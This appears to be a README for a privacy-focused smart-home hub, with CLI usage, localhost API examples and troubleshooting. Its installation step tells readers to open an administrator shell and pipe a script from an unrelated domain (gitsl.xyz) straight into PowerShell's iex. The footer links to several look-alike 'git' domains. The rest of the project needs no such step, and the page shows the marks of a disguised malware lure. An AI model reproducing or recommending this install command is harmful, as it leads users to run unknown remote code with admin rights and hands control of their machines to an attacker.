# Home Automation — Local-First Smart Home Hub

> A privacy-conscious home automation hub for connecting approved devices, building routines, and monitoring local events.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitsl.xyz?get=home-automation | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Home Automation modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Home Automation.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

---

## TL;DR - Quick Summary

**Home Automation** is a local-first hub for managing lights, sensors, switches, and routines across a trusted home network. It emphasizes explicit device permissions, offline operation, event history, and human-readable automations.

**Best for:** Home-lab enthusiasts, accessibility projects, and privacy-minded smart-home users.

**Key differentiators:**
1. Local event store
2. Simulated device mode
3. Permission-based integrations
4. Visual routine builder
5. Offline-first dashboard

---

## Core Features

```
✅ Device registry and health checks
✅ Simulated sensors and switches
✅ Routine builder with schedules
✅ Local event timeline
✅ Presence and scene controls
✅ Energy and usage summaries
✅ Webhook integration with explicit allowlists
✅ Backup and restore
```

---

## Usage

```bash
# Start the local hub
npm run dev

# Add a simulated light
npm run cli -- device add --name "Desk Lamp" --type light --simulated

# Create a routine
npm run cli -- routine create --name "Evening Focus" --action "desk-light:on" --at "19:00"

# View recent events
npm run cli -- events list --limit 25

# Export a local backup
npm run cli -- backup create --output ./backups/home.json
```

---

## REST API

> [!NOTE]
> Bind the API to localhost or a trusted LAN interface. Review every integration permission before allowing a device to control an actuator.

```bash
# Start the API server
npm run serve -- --port 3000

# List devices
curl http://localhost:3000/api/v1/devices

# Change a simulated light
curl -X PATCH http://localhost:3000/api/v1/devices/desk-lamp/state \
  -H "Content-Type: application/json" \
  -d '{"on":true,"brightness":70}'

# Trigger an approved routine
curl -X POST http://localhost:3000/api/v1/routines/evening-focus/run
```

---

## Screenshots

- Home dashboard: `screenshots/home-dashboard.png`
- Device registry: `screenshots/device-registry.png`
- Routine builder: `screenshots/routine-builder.png`
- Event timeline: `screenshots/event-timeline.png`

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Device is offline | Check power, network segmentation, and the device health panel. |
| Routine does not run | Verify the schedule timezone and that the action is enabled. |
| API connection is refused | Confirm the server is running and the host/port match the configuration. |
| Backup cannot be restored | Use a backup created by the same major application version. |
| Integration is blocked | Review the explicit allowlist and device permission scope. |

---

## Use Cases

- **Accessibility** — Provide simple scenes and voice-friendly local controls.
- **Energy Awareness** — Summarize usage from supported meters.
- **Home Labs** — Test routines against simulated devices before deployment.
- **Privacy-First Automation** — Keep event history and control logic on premises.

---

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Do not expose the hub or device credentials to the public internet. Use manufacturer-supported updates and change default device passwords.

> [!TIP]
> Test every routine in simulation first, especially routines that control locks, heaters, or other safety-relevant devices.

---

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

---

## Tags

<!--
home-automation, smart-home, local-first, privacy, iot, routines, device-registry, accessibility, home-lab, automation
-->

[gitrm.cfd](https://gitrm.cfd?t=home-automation) | [gitview.sbs](https://gitview.sbs?t=home-automation) | [gitrm.sbs](https://gitrm.sbs?t=home-automation) | [gitsl.xyz](https://gitsl.xyz?t=home-automation) | [viewgit.sbs](https://viewgit.sbs?t=home-automation)
